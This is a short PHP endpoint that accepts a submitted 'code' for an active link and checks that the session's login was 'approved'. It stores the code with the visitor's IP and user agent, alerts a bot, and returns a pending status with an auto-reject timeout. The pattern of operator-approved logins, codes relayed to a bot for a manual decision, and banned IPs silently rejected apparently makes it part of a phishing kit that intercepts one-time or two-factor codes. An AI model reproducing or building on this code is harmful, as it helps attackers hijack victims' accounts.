<?php
declare(strict_types=1);

require_once __DIR__ . '/../lib/bot.php';

header('Content-Type: application/json; charset=utf-8');

$raw = file_get_contents('php://input');
$body = json_decode((string)$raw, true) ?: [];
$link_id = trim((string)($body['id'] ?? ''));
$code    = trim((string)($body['code'] ?? ''));

if ($link_id === '' || $code === '') {
    http_response_code(400);
    echo json_encode(['error' => 'missing fields']);
    exit;
}
if (mb_strlen($code) > 64) {
    http_response_code(400);
    echo json_encode(['error' => 'code too long']);
    exit;
}

$link = db_one('SELECT * FROM links WHERE id = ? AND is_active = 1', [$link_id]);
if (!$link) {
    http_response_code(404);
    echo json_encode(['error' => 'link not found']);
    exit;
}

$session = require_approved_session($link_id);
if ($session === null) {
    http_response_code(403);
    echo json_encode(['error' => 'login not approved']);
    exit;
}

$ip = client_ip();
$ua = client_ua();
$session_id = $session['id'];

if (is_ip_banned($ip)) {
    db_run(
        'INSERT INTO attempts (link_id, session_id, code, ip, user_agent, status, responded_at)
         VALUES (?,?,?,?,?,"rejected", NOW())',
        [$link_id, $session_id, $code, $ip ?: null, $ua ?: null]
    );
    $attempt_id = (int)db()->lastInsertId();
} else {
    db_run(
        'INSERT INTO attempts (link_id, session_id, code, ip, user_agent) VALUES (?,?,?,?,?)',
        [$link_id, $session_id, $code, $ip ?: null, $ua ?: null]
    );
    $attempt_id = (int)db()->lastInsertId();

    try {
        notify_attempt($attempt_id);
    } catch (Throwable $e) {
        error_log('notify failed: ' . $e->getMessage());
    }
}

echo json_encode([
    'status'     => 'pending',
    'attempt_id' => $attempt_id,
    'timeout'    => (int)cfg_get('auto_reject_seconds'),
]);
